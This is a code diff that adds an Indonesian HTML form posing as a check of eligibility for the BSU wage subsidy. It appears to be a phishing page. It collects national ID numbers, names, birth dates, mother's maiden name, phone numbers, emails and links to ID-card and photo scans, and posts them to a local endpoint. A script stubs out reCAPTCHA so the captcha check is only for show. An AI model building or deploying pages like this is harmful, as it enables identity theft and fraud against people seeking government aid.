@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>BSU - Cek Penerima</title>
+    <style>
+        body { margin: 0; font-family: Arial, sans-serif; background-color: #f8f9fa; }
+        .section { padding: 40px 0; }
+        .bg-light { background-color: #f8f9fa; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
+        .bsu-validasi-right { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .form-control { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ced4da; border-radius: 4px; }
+        .form-label { font-weight: bold; }
+        .btn-primary { background: #007bff; color: #fff; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; }
+        .btn-primary:hover { background: #0056b3; }
+        p { margin: 10px 0; }
+    </style>
+    <script src="/js/scripts.js"></script>
+</head>
+<body>
+    <div class="section bg-light animate padding-bsu-validation">
+        <div class="container">
+            <div class="bsu-validasi-right" style="max-width: 600px; margin: 0 auto;">
+                <form id="form-bsu" action="/submit-bsu" method="POST">
+                    <div class="row">
+                        <h3>Cek Apakah Kamu Termasuk Calon Penerima BSU?</h3>
+                        <input id="token" name="token" type="hidden" value="">
+                        <div class="mb-3 col-lg-12">
+                            <input class="form-control rectangle-input-pembayaran-iuran" id="nik-bsu" name="nik" placeholder="NIK (Nomor Induk Kependudukan)" type="text" onkeypress="justNumber(event)" autocomplete="off" maxlength="16">
+                        </div>
+                        <div class="mb-3 col-lg-12">
+                            <input class="form-control rectangle-input-pembayaran-iuran" id="nama-bsu" name="namaKtp" placeholder="Nama Lengkap (Sesuai KTP)" type="text" oninput="this.value = this.value.toUpperCase()" autocomplete="off">
+                        </div>
+                        <div class="mb-3 col-lg-12">
+                            <input class="form-control rectangle-input-pembayaran-iuran" id="tgl-lahir-bsu" name="tanggalLahir" placeholder="Tanggal Lahir" autocomplete="off" type="text" readonly="" onfocus="handleDateInput(this)" ontouchstart="handleDateInput(this)" onblur="this.type='text'">
+                        </div>
+                        <div class="mb-3 col-lg-6">
+                            <input class="form-control rectangle-input-pembayaran-iuran" id="nama-ibu" name="namaIbu" placeholder="Nama Ibu Kandung" type="text" oninput="this.value = this.value.toUpperCase()" autocomplete="off">
+                        </div>
+                        <div class="mb-3 col-lg-6">
+                            <input class="form-control rectangle-input-pembayaran-iuran" id="nama-ibu-verif" name="namaIbuVerif" placeholder="Ketik ulang Nama Ibu Kandung" type="text" oninput="this.value = this.value.toUpperCase()" autocomplete="off">
+                        </div>
+                        <div class="mb-3 col-lg-6">
+                            <input class="form-control rectangle-input-pembayaran-iuran" id="hp" name="hp" placeholder="Nomor Handphone Terkini" type="text" onkeypress="justNumber(event)" autocomplete="off" maxlength="14">
+                        </div>
+                        <div class="mb-3 col-lg-6">
+                            <input class="form-control rectangle-input-pembayaran-iuran" id="hp-verif" name="hpVerif" placeholder="Ketik ulang Nomor Handphone" type="text" onkeypress="justNumber(event)" autocomplete="off" maxlength="14">
+                        </div>
+                        <div class="mb-3 col-lg-6">
+                            <input class="form-control rectangle-input-pembayaran-iuran" id="email" name="email" placeholder="Email Terkini" type="text" oninput="this.value = this.value.toLowerCase()" autocomplete="off">
+                        </div>
+                        <div class="mb-3 col-lg-6">
+                            <input class="form-control rectangle-input-pembayaran-iuran" id="email-verif" name="emailVerif" placeholder="Ketik ulang Email" type="text" oninput="this.value = this.value.toLowerCase()" autocomplete="off">
+                        </div>
+                        <div class="mb-3 col-lg-12">
+                            <label for="ktp-link" class="form-label">Link KTP (Google Drive, Dropbox, dll.)</label>
+                            <input class="form-control rectangle-input-pembayaran-iuran" id="ktp-link" name="ktpLink" placeholder="Masukkan link KTP" type="url" autocomplete="off">
+                            <p style="color: red; font-size: 12px;">Dokumen harus jelas dan valid, tidak boleh palsu.</p>
+                        </div>
+                        <div class="mb-3 col-lg-12">
+                            <label for="pas-foto-link" class="form-label">Link Pas Foto 4x6 (Google Drive, Dropbox, dll.)</label>
+                            <input class="form-control rectangle-input-pembayaran-iuran" id="pas-foto-link" name="pasFotoLink" placeholder="Masukkan link pas foto" type="url" autocomplete="off">
+                            <p style="color: red; font-size: 12px;">Dokumen harus jelas dan valid, tidak boleh palsu.</p>
+                        </div>
+                        <div class="mb-3 col-lg-12">
+                            <p style="color: red;">
+                                Pastikan nomor HP, email, dan link dokumen kamu benar agar bisa mendapatkan informasi penyaluran BSU
+                            </p>
+                        </div>
+                        <div class="mb-3 col-lg-12">
+                            <input type="submit" value="Lanjutkan" id="btn-cek-bsu" class="btn btn-primary btn-width-bsu-validasi">
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    <script>
+        window.grecaptcha = {
+            ready: function(cb) { cb(); },
+            execute: function() { return Promise.resolve(''); },
+            render: function() {}
+        };
+    </script>
+</body>
+</html>
